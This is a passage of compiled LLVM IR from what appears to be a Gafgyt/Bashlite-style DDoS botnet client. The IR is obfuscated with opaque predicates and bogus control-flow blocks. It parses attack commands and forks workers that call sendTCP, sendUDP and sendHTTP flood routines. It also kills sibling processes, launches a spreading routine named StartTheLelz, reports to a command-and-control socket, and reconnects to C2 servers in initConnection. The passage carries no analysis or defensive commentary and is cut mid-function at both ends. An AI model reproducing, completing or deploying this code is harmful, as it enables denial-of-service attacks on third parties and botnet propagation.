  br label %1056

; <label>:1055:                                   ; preds = %originalBBpart2136
  br label %1056

; <label>:1056:                                   ; preds = %1055, %originalBBpart2140
  %1057 = phi i32 [ %1046, %originalBBpart2140 ], [ 10, %1055 ]
  store i32 %1057, i32* %26, align 4
  %1058 = load i32, i32* %3, align 4
  %1059 = icmp sgt i32 %1058, 6
  br i1 %1059, label %1060, label %1065

; <label>:1060:                                   ; preds = %1056
  %1061 = load i8**, i8*** %4, align 8
  %1062 = getelementptr inbounds i8*, i8** %1061, i64 6
  %1063 = load i8*, i8** %1062, align 8
  %1064 = call i32 @atoi(i8* %1063) #10
  br label %1066

; <label>:1065:                                   ; preds = %1056
  br label %1066

; <label>:1066:                                   ; preds = %1065, %1060
  %1067 = phi i32 [ %1064, %1060 ], [ 0, %1065 ]
  store i32 %1067, i32* %27, align 4
  %1068 = load i8*, i8** %21, align 8
  %1069 = call i8* @strstr(i8* %1068, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #10
  %1070 = icmp ne i8* %1069, null
  br i1 %1070, label %1071, label %1123

; <label>:1071:                                   ; preds = %1066
  %1072 = load i32, i32* @x.107
  %1073 = load i32, i32* @y.108
  %1074 = sub i32 %1072, 1
  %1075 = mul i32 %1072, %1074
  %1076 = urem i32 %1075, 2
  %1077 = icmp eq i32 %1076, 0
  %1078 = icmp slt i32 %1073, 10
  %1079 = or i1 %1077, %1078
  br i1 %1079, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %1071
  %1080 = load i8*, i8** %21, align 8
  %1081 = call i8* @strtok(i8* %1080, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #5
  store i8* %1081, i8** %28, align 8
  %1082 = load i32, i32* @x.107
  %1083 = load i32, i32* @y.108
  %1084 = sub i32 %1082, 1
  %1085 = mul i32 %1082, %1084
  %1086 = urem i32 %1085, 2
  %1087 = icmp eq i32 %1086, 0
  %1088 = icmp slt i32 %1083, 10
  %1089 = or i1 %1087, %1088
  br i1 %1089, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br label %1090

; <label>:1090:                                   ; preds = %1120, %originalBBpart2144
  %1091 = load i8*, i8** %28, align 8
  %1092 = icmp ne i8* %1091, null
  br i1 %1092, label %1093, label %1122

; <label>:1093:                                   ; preds = %1090
  %1094 = load i32, i32* @x.107
  %1095 = load i32, i32* @y.108
  %1096 = sub i32 %1094, 1
  %1097 = mul i32 %1094, %1096
  %1098 = urem i32 %1097, 2
  %1099 = icmp eq i32 %1098, 0
  %1100 = icmp slt i32 %1095, 10
  %1101 = or i1 %1099, %1100
  br i1 %1101, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %1093
  %1102 = call i32 @listFork()
  %1103 = icmp ne i32 %1102, 0
  %1104 = load i32, i32* @x.107
  %1105 = load i32, i32* @y.108
  %1106 = sub i32 %1104, 1
  %1107 = mul i32 %1104, %1106
  %1108 = urem i32 %1107, 2
  %1109 = icmp eq i32 %1108, 0
  %1110 = icmp slt i32 %1105, 10
  %1111 = or i1 %1109, %1110
  br i1 %1111, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  br i1 %1103, label %1120, label %1112

; <label>:1112:                                   ; preds = %originalBBpart2148
  %1113 = load i8*, i8** %28, align 8
  %1114 = load i32, i32* %22, align 4
  %1115 = load i32, i32* %23, align 4
  %1116 = load i32, i32* %24, align 4
  %1117 = load i8*, i8** %25, align 8
  %1118 = load i32, i32* %27, align 4
  %1119 = load i32, i32* %26, align 4
  call void @sendTCP(i8* %1113, i32 %1114, i32 %1115, i32 %1116, i8* %1117, i32 %1118, i32 %1119)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1120:                                   ; preds = %originalBBpart2148
  %1121 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #5
  store i8* %1121, i8** %28, align 8
  br label %1090

; <label>:1122:                                   ; preds = %1090
  br label %1135

; <label>:1123:                                   ; preds = %1066
  %1124 = call i32 @listFork()
  %1125 = icmp ne i32 %1124, 0
  br i1 %1125, label %1126, label %1127

; <label>:1126:                                   ; preds = %1123
  br label %1297

; <label>:1127:                                   ; preds = %1123
  %1128 = load i8*, i8** %21, align 8
  %1129 = load i32, i32* %22, align 4
  %1130 = load i32, i32* %23, align 4
  %1131 = load i32, i32* %24, align 4
  %1132 = load i8*, i8** %25, align 8
  %1133 = load i32, i32* %27, align 4
  %1134 = load i32, i32* %26, align 4
  call void @sendTCP(i8* %1128, i32 %1129, i32 %1130, i32 %1131, i8* %1132, i32 %1133, i32 %1134)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1135:                                   ; preds = %1122
  %1136 = load i32, i32* @x.107
  %1137 = load i32, i32* @y.108
  %1138 = sub i32 %1136, 1
  %1139 = mul i32 %1136, %1138
  %1140 = urem i32 %1139, 2
  %1141 = icmp eq i32 %1140, 0
  %1142 = icmp slt i32 %1137, 10
  %1143 = or i1 %1141, %1142
  br i1 %1143, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %1135
  %1144 = load i32, i32* @x.107
  %1145 = load i32, i32* @y.108
  %1146 = sub i32 %1144, 1
  %1147 = mul i32 %1144, %1146
  %1148 = urem i32 %1147, 2
  %1149 = icmp eq i32 %1148, 0
  %1150 = icmp slt i32 %1145, 10
  %1151 = or i1 %1149, %1150
  br i1 %1151, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br label %1152

; <label>:1152:                                   ; preds = %originalBBpart2152, %865
  %1153 = load i32, i32* @x.107
  %1154 = load i32, i32* @y.108
  %1155 = sub i32 %1153, 1
  %1156 = mul i32 %1153, %1155
  %1157 = urem i32 %1156, 2
  %1158 = icmp eq i32 %1157, 0
  %1159 = icmp slt i32 %1154, 10
  %1160 = or i1 %1158, %1159
  br i1 %1160, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %1152
  %1161 = load i8**, i8*** %4, align 8
  %1162 = getelementptr inbounds i8*, i8** %1161, i64 0
  %1163 = load i8*, i8** %1162, align 8
  %1164 = call i32 @strcmp(i8* %1163, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.484, i32 0, i32 0)) #10
  %1165 = icmp ne i32 %1164, 0
  %1166 = load i32, i32* @x.107
  %1167 = load i32, i32* @y.108
  %1168 = sub i32 %1166, 1
  %1169 = mul i32 %1166, %1168
  %1170 = urem i32 %1169, 2
  %1171 = icmp eq i32 %1170, 0
  %1172 = icmp slt i32 %1167, 10
  %1173 = or i1 %1171, %1172
  br i1 %1173, label %originalBBpart2156, label %originalBB154alteredBB

originalBBpart2156:                               ; preds = %originalBB154
  br i1 %1165, label %1274, label %1174

; <label>:1174:                                   ; preds = %originalBBpart2156
  %1175 = load i32, i32* @x.107
  %1176 = load i32, i32* @y.108
  %1177 = sub i32 %1175, 1
  %1178 = mul i32 %1175, %1177
  %1179 = urem i32 %1178, 2
  %1180 = icmp eq i32 %1179, 0
  %1181 = icmp slt i32 %1176, 10
  %1182 = or i1 %1180, %1181
  br i1 %1182, label %originalBB158, label %originalBB158alteredBB

originalBB158:                                    ; preds = %originalBB158alteredBB, %1174
  store i32 0, i32* %29, align 4
  store i64 0, i64* %30, align 8
  %1183 = load i32, i32* @x.107
  %1184 = load i32, i32* @y.108
  %1185 = sub i32 %1183, 1
  %1186 = mul i32 %1183, %1185
  %1187 = urem i32 %1186, 2
  %1188 = icmp eq i32 %1187, 0
  %1189 = icmp slt i32 %1184, 10
  %1190 = or i1 %1188, %1189
  br i1 %1190, label %originalBBpart2160, label %originalBB158alteredBB

originalBBpart2160:                               ; preds = %originalBB158
  br label %1191

; <label>:1191:                                   ; preds = %1217, %originalBBpart2160
  %1192 = load i64, i64* %30, align 8
  %1193 = load i64, i64* @numpids, align 8
  %1194 = icmp ult i64 %1192, %1193
  br i1 %1194, label %1195, label %1220

; <label>:1195:                                   ; preds = %1191
  %1196 = load i32*, i32** @pids, align 8
  %1197 = load i64, i64* %30, align 8
  %1198 = getelementptr inbounds i32, i32* %1196, i64 %1197
  %1199 = load i32, i32* %1198, align 4
  %1200 = icmp ne i32 %1199, 0
  br i1 %1200, label %1201, label %1216

; <label>:1201:                                   ; preds = %1195
  %1202 = load i32*, i32** @pids, align 8
  %1203 = load i64, i64* %30, align 8
  %1204 = getelementptr inbounds i32, i32* %1202, i64 %1203
  %1205 = load i32, i32* %1204, align 4
  %1206 = call i32 @getpid() #5
  %1207 = icmp ne i32 %1205, %1206
  br i1 %1207, label %1208, label %1216

; <label>:1208:                                   ; preds = %1201
  %1209 = load i32*, i32** @pids, align 8
  %1210 = load i64, i64* %30, align 8
  %1211 = getelementptr inbounds i32, i32* %1209, i64 %1210
  %1212 = load i32, i32* %1211, align 4
  %1213 = call i32 @kill(i32 %1212, i32 9) #5
  %1214 = load i32, i32* %29, align 4
  %1215 = add nsw i32 %1214, 1
  store i32 %1215, i32* %29, align 4
  br label %1216

; <label>:1216:                                   ; preds = %1208, %1201, %1195
  br label %1217

; <label>:1217:                                   ; preds = %1216
  %1218 = load i64, i64* %30, align 8
  %1219 = add i64 %1218, 1
  store i64 %1219, i64* %30, align 8
  br label %1191

; <label>:1220:                                   ; preds = %1191
  %1221 = load i32, i32* @x.107
  %1222 = load i32, i32* @y.108
  %1223 = sub i32 %1221, 1
  %1224 = mul i32 %1221, %1223
  %1225 = urem i32 %1224, 2
  %1226 = icmp eq i32 %1225, 0
  %1227 = icmp slt i32 %1222, 10
  %1228 = or i1 %1226, %1227
  br i1 %1228, label %originalBB162, label %originalBB162alteredBB

originalBB162:                                    ; preds = %originalBB162alteredBB, %1220
  %1229 = load i32, i32* %29, align 4
  %1230 = icmp sgt i32 %1229, 0
  %1231 = load i32, i32* @x.107
  %1232 = load i32, i32* @y.108
  %1233 = sub i32 %1231, 1
  %1234 = mul i32 %1231, %1233
  %1235 = urem i32 %1234, 2
  %1236 = icmp eq i32 %1235, 0
  %1237 = icmp slt i32 %1232, 10
  %1238 = or i1 %1236, %1237
  br i1 %1238, label %originalBBpart2164, label %originalBB162alteredBB

originalBBpart2164:                               ; preds = %originalBB162
  br i1 %1230, label %1239, label %1256

; <label>:1239:                                   ; preds = %originalBBpart2164
  %1240 = load i32, i32* @x.107
  %1241 = load i32, i32* @y.108
  %1242 = sub i32 %1240, 1
  %1243 = mul i32 %1240, %1242
  %1244 = urem i32 %1243, 2
  %1245 = icmp eq i32 %1244, 0
  %1246 = icmp slt i32 %1241, 10
  %1247 = or i1 %1245, %1246
  br i1 %1247, label %originalBB166, label %originalBB166alteredBB

originalBB166:                                    ; preds = %originalBB166alteredBB, %1239
  %1248 = load i32, i32* @x.107
  %1249 = load i32, i32* @y.108
  %1250 = sub i32 %1248, 1
  %1251 = mul i32 %1248, %1250
  %1252 = urem i32 %1251, 2
  %1253 = icmp eq i32 %1252, 0
  %1254 = icmp slt i32 %1249, 10
  %1255 = or i1 %1253, %1254
  br i1 %1255, label %originalBBpart2168, label %originalBB166alteredBB

originalBBpart2168:                               ; preds = %originalBB166
  br label %1273

; <label>:1256:                                   ; preds = %originalBBpart2164
  %1257 = load i32, i32* @x.107
  %1258 = load i32, i32* @y.108
  %1259 = sub i32 %1257, 1
  %1260 = mul i32 %1257, %1259
  %1261 = urem i32 %1260, 2
  %1262 = icmp eq i32 %1261, 0
  %1263 = icmp slt i32 %1258, 10
  %1264 = or i1 %1262, %1263
  br i1 %1264, label %originalBB170, label %originalBB170alteredBB

originalBB170:                                    ; preds = %originalBB170alteredBB, %1256
  %1265 = load i32, i32* @x.107
  %1266 = load i32, i32* @y.108
  %1267 = sub i32 %1265, 1
  %1268 = mul i32 %1265, %1267
  %1269 = urem i32 %1268, 2
  %1270 = icmp eq i32 %1269, 0
  %1271 = icmp slt i32 %1266, 10
  %1272 = or i1 %1270, %1271
  br i1 %1272, label %originalBBpart2172, label %originalBB170alteredBB

originalBBpart2172:                               ; preds = %originalBB170
  br label %1273

; <label>:1273:                                   ; preds = %originalBBpart2172, %originalBBpart2168
  br label %1274

; <label>:1274:                                   ; preds = %1273, %originalBBpart2156
  %1275 = load i8**, i8*** %4, align 8
  %1276 = getelementptr inbounds i8*, i8** %1275, i64 0
  %1277 = load i8*, i8** %1276, align 8
  %1278 = call i32 @strcmp(i8* %1277, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.485, i32 0, i32 0)) #10
  %1279 = icmp ne i32 %1278, 0
  br i1 %1279, label %1297, label %1280

; <label>:1280:                                   ; preds = %1274
  %1281 = load i32, i32* @x.107
  %1282 = load i32, i32* @y.108
  %1283 = sub i32 %1281, 1
  %1284 = mul i32 %1281, %1283
  %1285 = urem i32 %1284, 2
  %1286 = icmp eq i32 %1285, 0
  %1287 = icmp slt i32 %1282, 10
  %1288 = or i1 %1286, %1287
  br i1 %1288, label %originalBB174, label %originalBB174alteredBB

originalBB174:                                    ; preds = %originalBB174alteredBB, %1280
  call void @exit(i32 0) #14
  %1289 = load i32, i32* @x.107
  %1290 = load i32, i32* @y.108
  %1291 = sub i32 %1289, 1
  %1292 = mul i32 %1289, %1291
  %1293 = urem i32 %1292, 2
  %1294 = icmp eq i32 %1293, 0
  %1295 = icmp slt i32 %1290, 10
  %1296 = or i1 %1294, %1295
  br i1 %1296, label %originalBBpart2176, label %originalBB174alteredBB

originalBBpart2176:                               ; preds = %originalBB174
  unreachable

; <label>:1297:                                   ; preds = %1274, %1126, %996, %859, %originalBBpart2112, %719, %originalBBpart292, %693, %originalBBpart284, %622, %541, %537, %443, %339, %originalBBpart224, %178, %originalBBpart212, %112, %45, %36
  %1298 = load i32, i32* @x.107
  %1299 = load i32, i32* @y.108
  %1300 = sub i32 %1298, 1
  %1301 = mul i32 %1298, %1300
  %1302 = urem i32 %1301, 2
  %1303 = icmp eq i32 %1302, 0
  %1304 = icmp slt i32 %1299, 10
  %1305 = or i1 %1303, %1304
  br i1 %1305, label %originalBB178, label %originalBB178alteredBB

originalBB178:                                    ; preds = %originalBB178alteredBB, %1297
  %1306 = load i32, i32* @x.107
  %1307 = load i32, i32* @y.108
  %1308 = sub i32 %1306, 1
  %1309 = mul i32 %1306, %1308
  %1310 = urem i32 %1309, 2
  %1311 = icmp eq i32 %1310, 0
  %1312 = icmp slt i32 %1307, 10
  %1313 = or i1 %1311, %1312
  br i1 %1313, label %originalBBpart2180, label %originalBB178alteredBB

originalBBpart2180:                               ; preds = %originalBB178
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %56
  %1314 = call i32 @listFork()
  %1315 = icmp ne i32 %1314, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %81
  %1316 = load i8**, i8*** %4, align 8
  %1317 = getelementptr inbounds i8*, i8** %1316, i64 0
  %1318 = load i8*, i8** %1317, align 8
  %1319 = call i32 @strcmp(i8* %1318, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.475, i32 0, i32 0)) #10
  %1320 = icmp ne i32 %1319, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %116
  %1321 = load i8**, i8*** %4, align 8
  %1322 = getelementptr inbounds i8*, i8** %1321, i64 1
  %1323 = load i8*, i8** %1322, align 8
  %1324 = call i32 @strcmp(i8* %1323, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.477, i32 0, i32 0)) #10
  %1325 = icmp ne i32 %1324, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %141
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %158
  %1326 = call i32 @fork() #5
  store i32 %1326, i32* %6, align 4
  store i32 400, i32* %7, align 4
  store i32 7, i32* %8, align 4
  %1327 = load i32, i32* %6, align 4
  %1328 = icmp ugt i32 %1327, 0
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %180
  %1329 = load i32, i32* %6, align 4
  %1330 = icmp eq i32 %1329, -1
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %199
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %217
  %1331 = load i32, i32* %8, align 4
  %1332 = load i32, i32* %7, align 4
  call void (i32, i32, ...) bitcast (void ()* @StartTheLelz to void (i32, i32, ...)*)(i32 %1331, i32 %1332)
  call void @_exit(i32 0) #12
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %236
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %253
  %1333 = load i8**, i8*** %4, align 8
  %1334 = getelementptr inbounds i8*, i8** %1333, i64 0
  %1335 = load i8*, i8** %1334, align 8
  %1336 = call i32 @strcmp(i8* %1335, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.478, i32 0, i32 0)) #10
  %1337 = icmp ne i32 %1336, 0
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %284
  %1338 = load i8**, i8*** %4, align 8
  %1339 = getelementptr inbounds i8*, i8** %1338, i64 2
  %1340 = load i8*, i8** %1339, align 8
  %1341 = call i32 @atoi(i8* %1340) #10
  %1342 = icmp eq i32 %1341, -1
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %379
  %1343 = call i32 @listFork()
  %1344 = icmp ne i32 %1343, 0
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %405
  %1345 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #5
  store i8* %1345, i8** %15, align 8
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %424
  %1346 = call i32 @listFork()
  %1347 = icmp ne i32 %1346, 0
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %444
  %1348 = load i8*, i8** %9, align 8
  %1349 = load i32, i32* %10, align 4
  %1350 = load i32, i32* %11, align 4
  %1351 = load i32, i32* %12, align 4
  %1352 = load i32, i32* %13, align 4
  %1353 = load i32, i32* %14, align 4
  call void @sendUDP(i8* %1348, i32 %1349, i32 %1350, i32 %1351, i32 %1352, i32 %1353)
  call void @_exit(i32 0) #12
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %467
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %490
  %1354 = load i32, i32* %3, align 4
  %1355 = icmp slt i32 %1354, 6
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %509
  %1356 = load i8**, i8*** %4, align 8
  %1357 = getelementptr inbounds i8*, i8** %1356, i64 3
  %1358 = load i8*, i8** %1357, align 8
  %1359 = call i32 @atoi(i8* %1358) #10
  %1360 = icmp slt i32 %1359, 1
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %542
  %1361 = load i32, i32* @mainCommSock, align 4
  %1362 = load i8**, i8*** %4, align 8
  %1363 = getelementptr inbounds i8*, i8** %1362, i64 1
  %1364 = load i8*, i8** %1363, align 8
  %1365 = load i8**, i8*** %4, align 8
  %1366 = getelementptr inbounds i8*, i8** %1365, i64 2
  %1367 = load i8*, i8** %1366, align 8
  %1368 = load i8**, i8*** %4, align 8
  %1369 = getelementptr inbounds i8*, i8** %1368, i64 3
  %1370 = load i8*, i8** %1369, align 8
  %1371 = call i32 @atoi(i8* %1370) #10
  %1372 = load i8**, i8*** %4, align 8
  %1373 = getelementptr inbounds i8*, i8** %1372, i64 5
  %1374 = load i8*, i8** %1373, align 8
  %1375 = call i32 @atoi(i8* %1374) #10
  %1376 = call i32 (i32, i8*, ...) @sockprintf(i32 %1361, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.480, i32 0, i32 0), i8* %1364, i8* %1367, i32 %1371, i32 %1375)
  %1377 = load i8**, i8*** %4, align 8
  %1378 = getelementptr inbounds i8*, i8** %1377, i64 1
  %1379 = load i8*, i8** %1378, align 8
  %1380 = load i8**, i8*** %4, align 8
  %1381 = getelementptr inbounds i8*, i8** %1380, i64 2
  %1382 = load i8*, i8** %1381, align 8
  %1383 = load i8**, i8*** %4, align 8
  %1384 = getelementptr inbounds i8*, i8** %1383, i64 3
  %1385 = load i8*, i8** %1384, align 8
  %1386 = call i32 @atoi(i8* %1385) #10
  %1387 = trunc i32 %1386 to i16
  %1388 = load i8**, i8*** %4, align 8
  %1389 = getelementptr inbounds i8*, i8** %1388, i64 4
  %1390 = load i8*, i8** %1389, align 8
  %1391 = load i8**, i8*** %4, align 8
  %1392 = getelementptr inbounds i8*, i8** %1391, i64 5
  %1393 = load i8*, i8** %1392, align 8
  %1394 = call i32 @atoi(i8* %1393) #10
  %1395 = load i8**, i8*** %4, align 8
  %1396 = getelementptr inbounds i8*, i8** %1395, i64 6
  %1397 = load i8*, i8** %1396, align 8
  %1398 = call i32 @atoi(i8* %1397) #10
  call void @sendHTTP(i8* %1379, i8* %1382, i16 zeroext %1387, i8* %1390, i32 %1394, i32 %1398)
  call void @exit(i32 0) #14
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %603
  %1399 = load i32, i32* %3, align 4
  %1400 = icmp ne i32 %1399, 2
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %623
  %1401 = load i8**, i8*** %4, align 8
  %1402 = getelementptr inbounds i8*, i8** %1401, i64 1
  %1403 = load i8*, i8** %1402, align 8
  %1404 = call i32 @strcmp(i8* %1403, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.476, i32 0, i32 0)) #10
  %1405 = icmp ne i32 %1404, 0
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %648
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %665
  %1406 = load i32, i32* @Phonepid, align 4
  %1407 = call i32 @kill(i32 %1406, i32 9) #5
  store i32 0, i32* @Phonepid, align 4
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %698
  %1408 = load i32, i32* %16, align 4
  store i32 %1408, i32* @Phonepid, align 4
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %720
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %739
  %1409 = load i8**, i8*** %4, align 8
  %1410 = getelementptr inbounds i8*, i8** %1409, i64 0
  %1411 = load i8*, i8** %1410, align 8
  %1412 = call i32 @strcmp(i8* %1411, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.482, i32 0, i32 0)) #10
  %1413 = icmp ne i32 %1412, 0
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %764
  %1414 = load i8**, i8*** %4, align 8
  %1415 = getelementptr inbounds i8*, i8** %1414, i64 2
  %1416 = load i8*, i8** %1415, align 8
  %1417 = call i32 @atoi(i8* %1416) #10
  %1418 = icmp slt i32 %1417, 1
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %786
  %1419 = load i8**, i8*** %4, align 8
  %1420 = getelementptr inbounds i8*, i8** %1419, i64 3
  %1421 = load i8*, i8** %1420, align 8
  %1422 = call i32 @atoi(i8* %1421) #10
  %1423 = icmp slt i32 %1422, 1
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %808
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %880
  %1424 = load i8**, i8*** %4, align 8
  %1425 = getelementptr inbounds i8*, i8** %1424, i64 2
  %1426 = load i8*, i8** %1425, align 8
  %1427 = call i32 @atoi(i8* %1426) #10
  %1428 = icmp eq i32 %1427, -1
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %914
  %1429 = load i32, i32* %3, align 4
  %1430 = icmp sgt i32 %1429, 6
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %933
  %1431 = load i8**, i8*** %4, align 8
  %1432 = getelementptr inbounds i8*, i8** %1431, i64 6
  %1433 = load i8*, i8** %1432, align 8
  %1434 = call i32 @atoi(i8* %1433) #10
  %1435 = icmp slt i32 %1434, 0
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %955
  %1436 = load i32, i32* %3, align 4
  %1437 = icmp eq i32 %1436, 8
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %974
  %1438 = load i8**, i8*** %4, align 8
  %1439 = getelementptr inbounds i8*, i8** %1438, i64 7
  %1440 = load i8*, i8** %1439, align 8
  %1441 = call i32 @atoi(i8* %1440) #10
  %1442 = icmp slt i32 %1441, 1
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %997
  %1443 = load i8**, i8*** %4, align 8
  %1444 = getelementptr inbounds i8*, i8** %1443, i64 1
  %1445 = load i8*, i8** %1444, align 8
  store i8* %1445, i8** %21, align 8
  %1446 = load i8**, i8*** %4, align 8
  %1447 = getelementptr inbounds i8*, i8** %1446, i64 2
  %1448 = load i8*, i8** %1447, align 8
  %1449 = call i32 @atoi(i8* %1448) #10
  store i32 %1449, i32* %22, align 4
  %1450 = load i8**, i8*** %4, align 8
  %1451 = getelementptr inbounds i8*, i8** %1450, i64 3
  %1452 = load i8*, i8** %1451, align 8
  %1453 = call i32 @atoi(i8* %1452) #10
  store i32 %1453, i32* %23, align 4
  %1454 = load i8**, i8*** %4, align 8
  %1455 = getelementptr inbounds i8*, i8** %1454, i64 4
  %1456 = load i8*, i8** %1455, align 8
  %1457 = call i32 @atoi(i8* %1456) #10
  store i32 %1457, i32* %24, align 4
  %1458 = load i8**, i8*** %4, align 8
  %1459 = getelementptr inbounds i8*, i8** %1458, i64 5
  %1460 = load i8*, i8** %1459, align 8
  store i8* %1460, i8** %25, align 8
  %1461 = load i32, i32* %3, align 4
  %1462 = icmp eq i32 %1461, 8
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1034
  %1463 = load i8**, i8*** %4, align 8
  %1464 = getelementptr inbounds i8*, i8** %1463, i64 7
  %1465 = load i8*, i8** %1464, align 8
  %1466 = call i32 @atoi(i8* %1465) #10
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1071
  %1467 = load i8*, i8** %21, align 8
  %1468 = call i8* @strtok(i8* %1467, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #5
  store i8* %1468, i8** %28, align 8
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1093
  %1469 = call i32 @listFork()
  %1470 = icmp ne i32 %1469, 0
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %1135
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %1152
  %1471 = load i8**, i8*** %4, align 8
  %1472 = getelementptr inbounds i8*, i8** %1471, i64 0
  %1473 = load i8*, i8** %1472, align 8
  %1474 = call i32 @strcmp(i8* %1473, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.484, i32 0, i32 0)) #10
  %1475 = icmp ne i32 %1474, 0
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %1174
  store i32 0, i32* %29, align 4
  store i64 0, i64* %30, align 8
  br label %originalBB158

originalBB162alteredBB:                           ; preds = %originalBB162, %1220
  %1476 = load i32, i32* %29, align 4
  %1477 = icmp sgt i32 %1476, 0
  br label %originalBB162

originalBB166alteredBB:                           ; preds = %originalBB166, %1239
  br label %originalBB166

originalBB170alteredBB:                           ; preds = %originalBB170, %1256
  br label %originalBB170

originalBB174alteredBB:                           ; preds = %originalBB174, %1280
  call void @exit(i32 0) #14
  br label %originalBB174

originalBB178alteredBB:                           ; preds = %originalBB178, %1297
  br label %originalBB178
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #2

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: nounwind
declare i32 @getpid() #2

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = icmp eq i64 %13, 1
  br i1 %14, label %15, label %32

; <label>:15:                                     ; preds = %10
  %16 = load i32, i32* @x.109
  %17 = load i32, i32* @y.110
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %15
  store i32 0, i32* @currentServer, align 4
  %24 = load i32, i32* @x.109
  %25 = load i32, i32* @y.110
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %51

; <label>:32:                                     ; preds = %10
